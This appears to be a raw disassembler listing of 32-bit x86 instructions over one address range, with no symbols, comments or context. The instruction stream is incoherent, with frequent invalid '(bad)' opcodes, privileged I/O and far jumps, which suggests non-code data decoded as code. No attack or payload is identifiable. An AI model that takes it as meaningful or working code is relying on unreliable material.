  419c70:	push   esi
  419c71:	mov    cl,0xd3
  419c73:	sbb    ebx,DWORD PTR [ecx-0x5c243f1a]
  419c79:	dec    esp
  419c7a:	inc    ebp
  419c7b:	rcl    dl,cl
  419c7d:	(bad)  
  419c7e:	into   
  419c7f:	and    BYTE PTR [edx],0x3e
  419c82:	fcmove st,st(3)
  419c84:	(bad)  
  419c85:	dec    edx
  419c87:	sbb    al,0x80
  419c89:	das    
  419c8a:	neg    BYTE PTR [esi]
  419c8c:	ret    0xa210
  419c8f:	jmp    0xf0d9:0xf2805b84
  419c96:	sub    al,0x44
  419c98:	fisttp QWORD PTR [edi-0x3071d571]
  419c9e:	inc    esp
  419c9f:	adc    ecx,DWORD PTR ds:0xc1c31af
  419ca5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ca6:	sbb    DWORD PTR [eax+0x6d],0x3f2e3d99
  419cad:	in     eax,0x5c
  419caf:	xchg   esi,edi
  419cb1:	outs   dx,BYTE PTR ds:[esi]
  419cb2:	xor    bh,ah
  419cb4:	rol    BYTE PTR [eax-0x4c],0xc9
  419cb8:	push   eax
  419cb9:	popf   
  419cba:	out    dx,eax
  419cbb:	push   0x40
  419cbd:	rcr    DWORD PTR [eax+0x53],1
  419cc0:	(bad)
  419cc3:	lods   al,BYTE PTR ds:[esi]
  419cc4:	mov    ah,0x69
  419cc6:	int    0xb3
  419cc8:	or     esi,DWORD PTR [eax+0x7d]
  419ccb:	jnp    0x419d4b
  419ccd:	jp     0x419c8a
  419ccf:	or     eax,0xf28a652e
  419cd4:	jecxz  0x419cba
  419cd6:	cli    
  419cd7:	or     ebp,DWORD PTR [esi-0xa753fa7]
  419cdd:	or     dh,0x27
  419ce0:	test   DWORD PTR [ecx+0x3ff93105],edx
  419ce6:	xchg   DWORD PTR [ecx-0x60],edi
  419ce9:	adc    BYTE PTR ds:0xf8a8904e,0xd6
  419cf0:	pop    ebp
  419cf1:	leave  
  419cf2:	loopne 0x419d18
  419cf4:	mov    eax,ds:0x2e4c33b
  419cf9:	lods   al,BYTE PTR ds:[esi]
  419cfa:	out    0x33,al
  419cfc:	or     eax,0x5986a2b2
  419d01:	ss mov al,0x5a
  419d04:	je     0x419d78
  419d06:	sub    al,0xfa
  419d08:	fwait
  419d09:	or     DWORD PTR [edi-0x6b97de8f],ecx
  419d0f:	xchg   esp,eax
  419d10:	shr    BYTE PTR [edi+0x953f306],cl
  419d16:	pop    es
  419d17:	cwde   
  419d18:	mov    esp,0x26b150af
  419d1d:	repnz xlat BYTE PTR ds:[ebx]
  419d1f:	iret   
  419d20:	test   DWORD PTR [ecx+0x26],ebp
  419d23:	cmp    bl,BYTE PTR [edx-0x30]
  419d26:	scas   al,BYTE PTR es:[edi]
  419d27:	shl    eax,0x5b
  419d2a:	cdq    
  419d2b:	add    eax,0x9dd6abc6
  419d30:	dec    eax
  419d31:	pop    edi
  419d32:	and    BYTE PTR [ebx-0x40],0x8b
  419d36:	cmp    eax,0x3e882116
  419d3b:	ins    BYTE PTR es:[edi],dx
  419d3c:	dec    ebx
  419d3d:	sbb    al,0xc0
  419d3f:	mov    al,ds:0x3a229fd7
  419d44:	sti    
  419d45:	aaa    
  419d46:	rcl    edi,cl
  419d48:	lahf   
  419d49:	push   esp
  419d4a:	clc    
  419d4b:	add    al,0xaa
  419d4d:	cmp    eax,0x8cf3a8c8
  419d52:	mov    ebp,0xe62f43d9
  419d57:	(bad)  
  419d59:	cs js  0x419d04
  419d5c:	mov    ch,0x4c
  419d5e:	inc    esi
  419d5f:	push   edx
  419d60:	cmp    eax,edi
  419d62:	pop    ss
  419d63:	cmc    
  419d64:	xchg   BYTE PTR [esi],ah
  419d66:	jle    0x419d81
  419d68:	mov    dh,0x3f
  419d6a:	mov    bh,0xd6
  419d6c:	movaps xmm7,XMMWORD PTR [eax+0x62408e13]
  419d73:	fwait
  419d74:	mov    ch,0x5f
  419d76:	nop
  419d77:	popf   
  419d78:	sbb    ah,BYTE PTR [eax]
  419d7a:	fnstenv [ebp+0x6fd5c1a]
  419d80:	in     eax,dx
  419d81:	jne    0x419db8
  419d83:	lock mov ah,0xe2
  419d86:	addr16 jne 0x419d92
  419d89:	or     cl,BYTE PTR [edi+0x5f9d22da]
  419d8f:	push   ebx
  419d90:	shl    al,1
  419d92:	ja     0x419dda
  419d94:	xor    eax,0x7c99d9d3
  419d99:	mov    al,ds:0xad91e1af
  419d9e:	jno    0x419d77
  419da0:	clc    
  419da1:	stos   BYTE PTR es:[edi],al
  419da2:	pop    esp
  419da3:	pop    ebx
  419da4:	sub    DWORD PTR [ebp-0x51],edx
  419da7:	and    DWORD PTR [eax],ecx
  419da9:	sar    al,1
  419dab:	mov    ah,0xf3
  419dad:	call   0x4e8259e5
  419db2:	and    ah,BYTE PTR [edi]
  419db4:	cmp    eax,0x78202611
  419db9:	add    al,0x9f
  419dbb:	xchg   esp,eax
  419dbc:	dec    edx
  419dbd:	sbb    eax,DWORD PTR [ebp-0x56]
  419dc0:	repz aaa 
  419dc2:	test   BYTE PTR [ebp-0x33],al
  419dc5:	imul   edi,DWORD PTR [eax+0x4],0xffffffdc
  419dc9:	add    ebx,DWORD PTR [esi]
  419dcb:	jmp    0x4eb401e1
  419dd0:	dec    eax
  419dd1:	cdq    
  419dd2:	adc    eax,0x4cbcd0e3
  419dd7:	pop    ds
  419dd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419dd9:	fsubr  st,st(1)
  419ddb:	cld    
  419ddc:	mov    esi,0xd17d4094
  419de1:	cdq    
  419de2:	repnz icebp 
  419de4:	aam    0x8c
  419de6:	mov    ds:0x5ca21d2,al
  419deb:	in     al,0xf1
  419ded:	mov    edi,0x5a92c0
  419df2:	push   ebp
  419df3:	mov    edx,0x657b657d
  419df8:	or     DWORD PTR [edi+0x497ac16e],edx
  419dfe:	sub    ecx,edx
  419e00:	daa    
  419e01:	pop    es
  419e02:	test   DWORD PTR [ecx+0x7d21ff2],esp
  419e08:	mov    eax,DWORD PTR [eax]
  419e0a:	inc    edi
  419e0b:	xchg   edi,eax
  419e0c:	aam    0x6
  419e0e:	lock or eax,0xc8c89fb7
  419e14:	cmp    BYTE PTR [ecx+ecx*1+0x154a06a7],ah
  419e1b:	adc    BYTE PTR es:[esi],ah
  419e1e:	dec    edi
  419e1f:	jmp    0x419e6c
  419e21:	(bad)  
  419e22:	adc    cl,BYTE PTR [esp+edi*1]
  419e25:	loop   0x419e0d
  419e27:	sub    DWORD PTR [ebp+edi*1-0xa],0xffffffcc
  419e2c:	sar    ah,0x11
  419e2f:	into   
  419e30:	pop    eax
  419e31:	jno    0x419dec
  419e33:	out    0xc2,eax
  419e35:	cs ret 0x1acf
  419e39:	push   ebx
  419e3a:	mov    ecx,0x679cf085
  419e3f:	push   ebx
  419e40:	lea    esi,ds:0xf0024369
  419e46:	dec    esi
  419e47:	add    bh,BYTE PTR [edx+ebp*4]
  419e4a:	xchg   ebp,eax
  419e4b:	mov    ?,WORD PTR [edx+0x1d]
  419e4e:	rol    DWORD PTR [edx-0x20],cl
  419e51:	or     ch,BYTE PTR [eax]
  419e53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e54:	test   BYTE PTR [edi+0x55],0xd9
  419e58:	ins    DWORD PTR es:[edi],dx
  419e59:	in     al,dx
  419e5a:	hlt    
  419e5b:	sub    eax,0x739460bc
  419e60:	adc    eax,0x4dae4c8a
  419e65:	mov    al,ds:0x5e52f706
  419e6a:	jp     0x419e73
  419e6c:	mov    bh,0x23
  419e6e:	xor    dh,BYTE PTR [edx]
  419e70:	mov    gs,eax
  419e72:	sbb    BYTE PTR [edi-0x80],0x5b
  419e76:	out    0x98,al
  419e78:	lahf   
  419e79:	rol    DWORD PTR [ebx-0x50],0xa9
  419e7d:	push   esp
  419e7e:	mov    eax,0x635b601
  419e83:	or     eax,0x44472035
  419e88:	and    al,0xc6
  419e8a:	or     eax,esi
  419e8c:	test   al,0x96
  419e8e:	push   cs
  419e8f:	or     DWORD PTR [esi+ecx*1-0x1f],edi
  419e93:	xor    BYTE PTR [esi],dl
  419e95:	mov    DWORD PTR [edi+edi*4],0x14dfdb0
  419e9c:	aad    0x45
  419e9e:	es (bad) 
  419ea0:	mov    ds:0x55d459cc,al
  419ea5:	jb     0x419efe
  419ea7:	cmp    DWORD PTR [edi],ecx
  419ea9:	xchg   esp,eax
  419eaa:	xchg   edx,eax
  419eab:	jp     0x419ed7
  419ead:	mov    ecx,0x4d9ad3e
  419eb2:	xlat   BYTE PTR ds:[ebx]
  419eb3:	sbb    edi,esi
  419eb5:	lods   eax,DWORD PTR ds:[esi]
  419eb6:	cmp    BYTE PTR [ebx+0x30],ch
  419eb9:	cmp    ecx,DWORD PTR [ebx]
  419ebb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ebc:	jo     0x419e67
  419ebe:	push   eax
  419ebf:	sbb    ah,BYTE PTR [ebx+0x45]
  419ec2:	mov    edi,0x33dfd70b
  419ec7:	std    
  419ec8:	sub    esi,ecx
  419eca:	test   DWORD PTR [edx],eax
  419ecc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ecd:	sbb    BYTE PTR [edi],ah
  419ecf:	add    ebp,eax
  419ed1:	jo     0x419f4b
  419ed3:	push   es
  419ed4:	mov    esi,0x1ae7e902
  419ed9:	inc    edx
  419eda:	cdq    
  419edb:	jp     0x419f0f
  419edd:	bound  esi,QWORD PTR [ebx-0x57]
  419ee0:	sahf   
  419ee1:	mov    ecx,0xe9062ba6
  419ee6:	loopne 0x419e89
  419ee8:	je     0x419f62
  419eea:	out    0xfa,al
  419eec:	pop    ds
  419eed:	xchg   ebp,eax
  419eef:	xchg   ch,ah
  419ef1:	pop    es
  419ef2:	repnz movzx esi,WORD PTR [esi+0x75bddb9d]
  419efa:	add    DWORD PTR [esi-0x7c],ebx
  419efd:	aam    0x98
  419eff:	add    DWORD PTR ds:0x49895800,ebp
  419f05:	js     0x419efc
  419f07:	aas    
  419f08:	xchg   ebx,eax
  419f09:	sub    cl,cl
  419f0b:	out    0xe9,al
  419f0d:	add    al,0x7e
  419f0f:	or     bh,cl
  419f11:	jecxz  0x419f4d
  419f13:	ds pop edx
  419f15:	daa    
  419f16:	lods   al,BYTE PTR ds:[esi]
  419f17:	mov    eax,ds:0x5f9f4ccc
  419f1c:	sbb    dh,al
  419f1e:	push   ecx
  419f1f:	xor    ecx,DWORD PTR [edx]
  419f21:	mov    bh,0xb0
  419f23:	jmp    0x3de:0xf867fb1f
  419f2a:	lds    ebp,FWORD PTR fs:[edi]
  419f2d:	xor    eax,0xd4313ed5
  419f32:	(bad)  
  419f33:	jecxz  0x419f53
  419f35:	cmp    DWORD PTR [edi-0x2bfe26ce],esp
  419f3b:	push   edi
  419f3c:	(bad)  
  419f3d:	xlat   BYTE PTR ds:[ebx]
  419f3e:	dec    eax
  419f3f:	lods   eax,DWORD PTR ds:[esi]
  419f40:	push   0x63
  419f42:	mov    eax,ds:0xd462d7e0
  419f47:	rcr    DWORD PTR ds:0xdc02e115,cl
  419f4d:	pop    ds
  419f4e:	push   edx
  419f4f:	mov    ecx,0xb1eeb9d7
  419f54:	jae    0x419fae
  419f56:	xchg   ebp,eax
  419f57:	je     0x419f20
  419f59:	or     al,0x4a
  419f5b:	jle    0x419f11
  419f5d:	sub    BYTE PTR [edi+0x37],dh
  419f60:	push   edx
  419f61:	jnp    0x419efd
  419f63:	leave  
  419f64:	cmp    eax,0x535776b5
  419f69:	ins    BYTE PTR es:[edi],dx
  419f6a:	inc    esp
  419f6b:	push   0x7a
  419f6d:	cmc    
  419f6e:	in     eax,0x95
  419f70:	cmc    
  419f71:	pop    ecx
  419f72:	push   ebp
  419f73:	rcr    DWORD PTR [edx],1
  419f75:	int    0x6a
  419f77:	xchg   edx,eax
  419f78:	aad    0x5e
  419f7a:	test   DWORD PTR es:[esi+eiz*4+0x12],eax
  419f7f:	sub    eax,0x789d2940
  419f84:	adc    eax,0xe107ff27
  419f89:	out    dx,al
  419f8a:	jge    0x419f2b
  419f8c:	jecxz  0x419f30
  419f8e:	setle  BYTE PTR [eax]
  419f91:	test   eax,0x40b79b2e
  419f96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419f97:	test   esp,edx
  419f99:	mov    edi,0xe4ef2eff
  419f9e:	dec    ecx
  419f9f:	imul   ebx,ebx,0xc3c30ee2
  419fa5:	pop    ds
  419fa6:	inc    edx
  419fa7:	pop    es
  419fa8:	push   0x53
  419faa:	pop    eax
  419fab:	pop    DWORD PTR [eax-0x1133a94e]
  419fb1:	push   edx
  419fb2:	cdq    
  419fb3:	inc    eax
  419fb4:	push   ebp
  419fb5:	mov    ecx,0x2e4ae80e
  419fba:	push   ss
  419fbb:	dec    eax
  419fbc:	pop    edi
  419fbd:	(bad)  
  419fbe:	jp     0x41a028
  419fc0:	aaa    
  419fc1:	dec    ebp
  419fc2:	mov    ds:0x686f2239,eax
  419fc7:	imul   edx,ebx,0x52
  419fca:	mov    esi,0xd16a2437
  419fcf:	fild   WORD PTR [ebp+0x21]
  419fd2:	in     al,dx
  419fd3:	dec    edx
  419fd4:	push   eax
  419fd5:	aaa    
  419fd6:	ins    BYTE PTR es:[edi],dx
  419fd7:	out    0x2e,al
  419fd9:	sbb    BYTE PTR ds:0xc9be856b,ah
  419fdf:	sub    esi,DWORD PTR [ecx+0x6f]
  419fe2:	mov    dl,0x1e
  419fe4:	add    DWORD PTR [esi],ecx
  419fe6:	(bad)  
  419fe7:	out    dx,al
  419fe8:	or     eax,0x2f1d226
  419fed:	inc    edi
  419fee:	sbb    al,0x4a
  419ff0:	xchg   ecx,eax
  419ff1:	rcr    DWORD PTR [ebx],0x8f
  419ff4:	adc    esp,DWORD PTR ds:0xade33e1f
  419ffa:	mov    es,WORD PTR [ebp-0x4777964e]
  41a000:	adc    eax,0x38bcd468
  41a005:	(bad)
  41a008:	inc    ebp
  41a009:	jmp    0x419fd5
  41a00b:	fucomi st,st(0)
  41a00d:	mov    edx,0x11437f90
  41a012:	add    BYTE PTR [eax],al
  41a014:	and    DWORD PTR [ebp-0x4531ebb4],edi
  41a01a:	jb     0x41a078
  41a01c:	sub    eax,0xb1691503
  41a021:	retf   0x2cb1
  41a024:	jmp    DWORD PTR [edi]
  41a026:	mov    ch,0x86
  41a028:	xor    edx,DWORD PTR [ebx+0x71eaf8c7]
  41a02e:	pop    ebp
  41a02f:	dec    DWORD PTR ds:[eax+0x40]
  41a033:	push   ebp
  41a034:	sub    eax,0xea6445eb
  41a039:	mov    ds:0x121bd50f,al
  41a03e:	push   0x788a887c
  41a043:	mov    eax,0x5ecd84d5
  41a048:	inc    esi
  41a049:	inc    ebp
  41a04a:	sbb    dh,ah
  41a04c:	enter  0x8217,0x7f
  41a050:	jge    0x41a064
  41a052:	mov    WORD PTR [ebp-0x44384a7a],?
  41a058:	mov    DWORD PTR ds:0x3f0756d0,esp
  41a05e:	fwait
  41a05f:	stos   BYTE PTR es:[edi],al
  41a060:	mov    dl,0x50
  41a062:	and    edi,DWORD PTR [edx+0x721918f1]
  41a068:	pop    ecx
  41a069:	push   ebp
  41a06a:	adc    bh,dl
  41a06c:	aaa    
  41a06d:	sbb    BYTE PTR [eax+ebp*1+0x4c],ah
  41a071:	xchg   BYTE PTR [edi],ah
  41a073:	(bad)  
  41a074:	std    
  41a075:	sahf   
  41a076:	shr    BYTE PTR ds:0x6dba3f52,cl
  41a07c:	inc    ecx
  41a07d:	sub    al,BYTE PTR [eax-0x44552a21]
  41a083:	cmp    eax,0x552bc4dd
  41a088:	ss jo  0x41a010
  41a08b:	adc    DWORD PTR [ecx-0x5e],ecx
  41a08e:	and    bl,bh
  41a090:	inc    ecx
  41a091:	xlat   BYTE PTR ds:[ebx]
  41a092:	mov    eax,ds:0x9c2525d4
  41a097:	and    cl,BYTE PTR [ecx-0x691faf4e]
  41a09d:	mov    WORD PTR [ebx-0x764cacc8],?
  41a0a3:	cmp    eax,0x3ba42137
  41a0a8:	pop    es
  41a0a9:	pop    ss
  41a0aa:	dec    edx
  41a0ab:	xor    dh,ch
  41a0ad:	mov    ds:0x439cae1a,eax
  41a0b2:	lods   eax,DWORD PTR ds:[esi]
  41a0b3:	sub    BYTE PTR [esi+0xb],cl
  41a0b6:	or     al,0x2d
  41a0b8:	mov    edi,0x1143a69b
  41a0bd:	add    al,0x98
  41a0bf:	fmul   DWORD PTR [esi+0x1b]
  41a0c2:	push   eax
  41a0c3:	les    eax,FWORD PTR [ebp-0x1a350d0b]
  41a0c9:	sbb    BYTE PTR [edx+0x134c209f],bl
  41a0cf:	add    al,0x7
  41a0d1:	jno    0x41a152
  41a0d3:	ret    
  41a0d4:	bound  eax,QWORD PTR [eax+0x3b657164]
  41a0da:	mov    ch,0x57
  41a0dc:	jecxz  0x41a140
  41a0de:	add    eax,0x5f
  41a0e1:	dec    edx
  41a0e2:	jne    0x41a157
  41a0e4:	adc    al,0xbb
  41a0e6:	ja     0x41a078
  41a0e8:	inc    ebx
  41a0e9:	jns    0x41a0d1
  41a0eb:	sub    bh,BYTE PTR [eax+ebx*1-0x1f]
  41a0ef:	lods   al,BYTE PTR ds:[esi]
  41a0f0:	stc    
  41a0f1:	jl     0x41a083
  41a0f3:	push   0x30bc2759
  41a0f8:	sar    BYTE PTR [edi+0x46],cl
  41a0fb:	repnz mov eax,0x86e7ed9b
  41a101:	or     al,0xa8
  41a103:	(bad)  
  41a104:	mov    edx,0x4e553daa
  41a109:	xchg   esp,eax
  41a10a:	inc    esp
  41a10b:	mov    dh,0x3a
  41a10d:	test   al,0x94
  41a10f:	scas   al,BYTE PTR es:[edi]
  41a110:	pop    edi
  41a111:	cmp    eax,0x5a80cf67
  41a116:	mov    al,ds:0xa6fdf778
  41a11b:	push   eax
  41a11c:	popa   
  41a11d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a11e:	cmc    
  41a11f:	inc    ebp
  41a120:	ja     0x41a103
  41a122:	in     eax,dx
  41a123:	push   0x8d7845ff
  41a128:	leave  
  41a129:	out    dx,al
  41a12a:	mov    eax,ds:0x62b57912
  41a12f:	test   eax,0xb84471c8
  41a134:	pop    ebx
  41a135:	scas   eax,DWORD PTR es:[edi]
  41a136:	xchg   esp,eax
  41a137:	ss jo  0x41a137
  41a13a:	rcr    DWORD PTR [edi-0x50],cl
  41a13d:	in     al,0x2d
  41a13f:	aam    0xfa
  41a141:	mov    cl,0x33
  41a143:	mov    eax,ds:0xeb4a89d6
  41a148:	adc    DWORD PTR [esi-0x553e6fb9],esi
  41a14e:	push   esi
  41a14f:	xchg   edi,eax
  41a150:	push   ebx
  41a151:	fcmovnb st,st(7)
  41a153:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a154:	test   al,0x5d
  41a156:	mov    bl,0x39
  41a158:	dec    eax
  41a159:	or     eax,0x7fa6b5ac
  41a15e:	int    0x67
  41a160:	mov    WORD PTR [ebp-0x7738db6d],?
  41a166:	repnz cmp BYTE PTR [esi],0x75
  41a16a:	imul   esi,ecx,0xb243b1a9
  41a170:	pop    ss
  41a171:	pop    ss
  41a172:	jmp    0xdf5611d9
  41a177:	div    ah
  41a179:	add    ch,bl
  41a17b:	pop    ds
  41a17c:	or     BYTE PTR [edx-0x6d],0x99
  41a180:	pop    DWORD PTR [bp+di+0x915]
  41a185:	test   BYTE PTR gs:[esp+esi*1+0x44dc3bd3],al
  41a18d:	les    eax,FWORD PTR [eax+0x53]
  41a190:	push   eax
  41a191:	mov    si,0xd492
  41a195:	stc    
  41a196:	jo     0x41a16f
  41a198:	outs   dx,BYTE PTR ds:[esi]
  41a199:	jle    0x41a1eb
  41a19b:	adc    edi,DWORD PTR [ebx+esi*1-0x5a]
  41a19f:	lods   al,BYTE PTR ds:[esi]
  41a1a0:	aaa    
  41a1a1:	and    ecx,edx
  41a1a3:	dec    ebp
  41a1a4:	jl     0x41a17b
  41a1a6:	xor    BYTE PTR gs:[eax-0x3],0xef
  41a1ab:	add    al,0x1
  41a1ad:	xlat   BYTE PTR ds:[ebx]
  41a1ae:	dec    ecx
  41a1af:	shl    BYTE PTR [eax],1
  41a1b1:	pop    ecx
  41a1b2:	das    
  41a1b3:	adc    ebp,DWORD PTR [ebp+eiz*1-0x55a102f6]
  41a1ba:	out    0x8c,al
  41a1bc:	xor    BYTE PTR [ebx-0x15bd1528],0xa8
  41a1c3:	gs stos BYTE PTR es:[edi],al
  41a1c5:	xor    al,0x4e
  41a1c7:	nop
  41a1c8:	enter  0xc0e7,0x56
  41a1cc:	bound  edx,QWORD PTR [edx-0x359984d6]
  41a1d2:	pop    ds
  41a1d3:	lea    edi,ds:0x3c36ef44
  41a1d9:	test   eax,0x2d23c70f
  41a1de:	mov    dl,0x54
  41a1e0:	sbb    esi,DWORD PTR [ecx+esi*8-0x2c99285a]
  41a1e7:	fild   DWORD PTR [edx]
  41a1e9:	pop    eax
  41a1ea:	addr16 xchg bl,ah
  41a1ed:	xor    al,0xa4
  41a1ef:	leave  
  41a1f0:	mov    bh,0x2d
  41a1f2:	pop    eax
  41a1f3:	pop    ds
  41a1f4:	daa    
  41a1f5:	mov    eax,ds:0x4d95ea87
  41a1fa:	in     al,dx
  41a1fb:	xchg   esi,eax
  41a1fc:	imul   edx,eax,0xd
  41a1ff:	sbb    BYTE PTR [ecx+0x31],0x24
  41a203:	jnp    0x41a1db
  41a205:	or     al,0x22
  41a207:	in     al,dx
  41a208:	xchg   esi,eax
  41a209:	mov    esp,0x9cab589b
  41a20e:	pop    ebp
  41a20f:	repz and eax,0xf75466f5
  41a215:	inc    ecx
  41a216:	mov    ds:0x38b1a38b,eax
  41a21b:	mov    ecx,0x967ab2d1
  41a220:	jecxz  0x41a289
  41a222:	out    0xf7,eax
  41a224:	scas   al,BYTE PTR es:[edi]
  41a225:	lods   al,BYTE PTR ds:[esi]
  41a226:	nop
  41a227:	mov    cl,0xca
  41a229:	shl    DWORD PTR [ebx+0x4],0xac
  41a22d:	add    esp,edx
  41a22f:	(bad)  [edi+0x25]
  41a232:	out    dx,eax
  41a233:	xor    esp,0x8fb55873
  41a239:	pop    ebx
  41a23a:	add    DWORD PTR [ebp+0x2b86990a],0x744bc6da
  41a244:	stos   BYTE PTR es:[edi],al
  41a245:	xor    eax,0x15b6afed
  41a24a:	or     BYTE PTR [ecx],dl
  41a24c:	lds    ebx,FWORD PTR [edx-0x8ab6991]
  41a252:	mov    ecx,0x11cfb59
  41a257:	das    
  41a258:	jno    0x41a24c
  41a25a:	jno    0x41a236
  41a25c:	(bad)  
  41a25d:	mov    edx,eax
  41a25f:	xor    DWORD PTR [eax],edx
  41a261:	mov    al,0x66
  41a263:	mov    ebp,0xecd4aa73
  41a268:	push   ds
  41a269:	pop    ebp
  41a26a:	ret    0x7b89
  41a26d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a26e:	out    dx,eax
  41a26f:	js     0x41a2bb
  41a271:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a272:	loop   0x41a2a9
  41a274:	sbb    eax,0xede79448
  41a279:	and    dh,ch
  41a27b:	iret   
  41a27c:	mov    ah,0xf4
  41a27e:	arpl   WORD PTR [ecx-0x59],di
  41a281:	fs imul esp,edx,0x6b198ad1
  41a288:	imul   eax,DWORD PTR [edx+edx*4-0x3f8a6a5c],0x9193b486
  41a293:	icebp  
  41a294:	ins    BYTE PTR es:[edi],dx
  41a295:	sub    esi,DWORD PTR [ecx+0x12]
  41a298:	test   al,0x3d
  41a29a:	pop    esi
  41a29b:	icebp  
  41a29c:	dec    ebx
  41a29d:	pushf  
  41a29e:	repnz push es
  41a2a0:	dec    ebp
  41a2a1:	dec    ebp
  41a2a2:	loop   0x41a2cc
  41a2a4:	pop    DWORD PTR [ecx-0x6b]
  41a2a7:	fbld   TBYTE PTR [ebp+edx*1-0x53f542a1]
  41a2ae:	sbb    eax,0xd54a795b
  41a2b3:	and    eax,0xf1dd8471
  41a2b8:	pop    edx
  41a2b9:	push   es
  41a2ba:	xchg   edx,eax
  41a2bb:	push   edi
  41a2bc:	mov    al,0x81
  41a2be:	sti    
  41a2bf:	push   edi
  41a2c0:	not    BYTE PTR fs:[edx+0x702462f1]
  41a2c7:	icebp  
  41a2c8:	shr    BYTE PTR [ecx-0x7bae0024],0xa0
  41a2cf:	sub    ah,ah
  41a2d1:	imul   ebx,DWORD PTR [edi],0x68146b3d
  41a2d7:	outs   dx,DWORD PTR ds:[esi]
  41a2d8:	outs   dx,BYTE PTR ds:[esi]
  41a2d9:	shr    DWORD PTR ds:0xc0782ed7,0x83
  41a2e0:	pushf  
  41a2e1:	pop    ebp
  41a2e2:	mov    ebx,0x7940806f
  41a2e7:	dec    eax
  41a2e8:	cmp    BYTE PTR [edi-0x2ef5c453],ah
  41a2ee:	xor    eax,0xf442a4f9
  41a2f3:	push   ecx
  41a2f4:	bound  edi,QWORD PTR [edx+ebx*4]
  41a2f7:	(bad)  
  41a2f9:	arpl   WORD PTR [esi],si
  41a2fb:	pop    ebx
  41a2fc:	mov    edi,?
  41a2fe:	add    al,0xdc
  41a300:	and    BYTE PTR [ecx-0x1842e0a2],cl
  41a306:	push   edx
  41a307:	push   esp
  41a308:	jge    0x41a2a8
  41a30a:	xchg   edx,eax
  41a30b:	cmp    al,0xf7
  41a30d:	pop    ax
  41a30f:	jecxz  0x41a383
  41a311:	push   ebx
  41a312:	(bad)  
  41a313:	rcr    BYTE PTR [ebx-0xe],cl
  41a316:	dec    esi
  41a317:	fdiv   DWORD PTR [ebp+ecx*1+0x4f]
  41a31b:	push   ss
  41a31c:	and    dl,BYTE PTR [eax+ebp*2+0x7ff21ce1]
  41a323:	dec    ebp
  41a324:	mov    ebx,0xcdb19619
  41a329:	ret    
  41a32a:	in     eax,dx
  41a32b:	lds    edi,FWORD PTR [ebx-0x36]
  41a32e:	and    al,0xf0
  41a330:	inc    ebx
  41a331:	dec    esi
  41a332:	loop   0x41a3af
  41a334:	or     bl,BYTE PTR [ecx+ebp*8-0x41ac593b]
  41a33b:	add    al,0xbf
  41a33d:	mov    al,BYTE PTR [ebp-0x13140aaf]
  41a343:	lock adc esp,DWORD PTR [esp+ebp*8-0x39]
  41a348:	pusha  
  41a349:	rol    DWORD PTR [eax+0x5e],0x64
  41a34d:	call   0x2f2a:0xd9ff9901
  41a354:	fwait
  41a355:	mov    ds:0x14a61bfc,eax
  41a35a:	or     edi,0x74240ea4
  41a360:	imul   ebx,edi,0xffffff8c
  41a363:	arpl   WORD PTR [eax+ecx*8+0x54a35a2b],ax
  41a36a:	push   0xfffffff3
  41a36c:	mov    dl,0xd4
  41a36e:	and    ebx,DWORD PTR [edi-0x2ca21bfe]
  41a374:	mov    fs,WORD PTR [ebp-0x7d]
  41a377:	push   bp
  41a379:	arpl   WORD PTR ds:0x1f8c5692,di
  41a37f:	sbb    DWORD PTR ds:0x7643f4c2,ecx
  41a385:	push   0x54
  41a387:	mov    ecx,0xc807c21d
  41a38c:	repnz neg DWORD PTR [ebx]
  41a38f:	push   ss
  41a390:	popf   
  41a391:	push   ebp
  41a392:	int    0x40
  41a394:	std    
  41a395:	pop    ecx
  41a396:	sbb    DWORD PTR [edi-0x45],edx
  41a399:	das    
  41a39a:	ret    0x1845
  41a39d:	into   
  41a39e:	push   ebp
  41a39f:	adc    ch,BYTE PTR [ebp+0x70]
  41a3a2:	add    BYTE PTR [eax],cl
  41a3a4:	xchg   ebx,eax
  41a3a5:	mov    cl,0x7e
  41a3a7:	pop    ebp
  41a3a8:	xlat   BYTE PTR ds:[ebx]
  41a3a9:	push   ecx
  41a3aa:	mov    al,ds:0xb5f5c6d3
  41a3af:	push   0xd7411353
  41a3b4:	mov    esp,0x8fde02ad
  41a3b9:	xor    DWORD PTR [eax+ebx*4],eax
  41a3bc:	inc    esp
  41a3bd:	aad    0xfb
  41a3bf:	fisubr WORD PTR [eax]
  41a3c1:	(bad)  
  41a3c2:	(bad)  
  41a3c3:	aaa    
  41a3c4:	fnsave ds:0xf05c7091
  41a3ca:	mov    ebp,0x8cfeaa7
  41a3cf:	add    eax,0xa86d4e55
  41a3d4:	out    dx,al
  41a3d5:	cld    
  41a3d6:	aam    0x22
  41a3d8:	test   DWORD PTR [edx],ebp
  41a3da:	retf   
  41a3db:	xlat   BYTE PTR ds:[ebx]
  41a3dc:	nop
  41a3dd:	test   edx,edi
  41a3df:	jno    0x41a449
  41a3e1:	jo     0x41a422
  41a3e3:	aas    
  41a3e4:	cs cmc 
  41a3e6:	das    
  41a3e7:	neg    ecx
  41a3e9:	aad    0x6e
  41a3eb:	jmp    0xd5a2f0f4
  41a3f0:	jmp    0xe0db9b0a
  41a3f5:	sbb    al,0x97
  41a3f7:	mov    bh,0x31
  41a3f9:	jl     0x41a3a3
  41a3fb:	pop    es
  41a3fc:	imul   edx,DWORD PTR [ebx+ebp*2+0x675e9a0e],0xa4553c19
  41a407:	je     0x41a39e
  41a409:	inc    ebp
  41a40a:	and    al,0x55
  41a40c:	repnz lods al,BYTE PTR ds:[esi]
  41a40e:	push   cs
  41a40f:	mov    ds:0xb03fc773,eax
  41a414:	push   edx
  41a415:	outs   dx,DWORD PTR gs:[esi]
  41a417:	add    al,0x29
  41a419:	inc    edi
  41a41a:	inc    ebp
  41a41b:	cmp    al,0x62
  41a41d:	xchg   ecx,eax
  41a41e:	xor    BYTE PTR [eax+0x61],cl
  41a421:	rcl    eax,1
  41a423:	ret    0xc39d
  41a426:	es adc al,0xe5
  41a429:	test   DWORD PTR [ecx],esi
  41a42b:	fucomip st,st(0)
  41a42d:	enter  0xf4f4,0x3b
  41a431:	hlt    
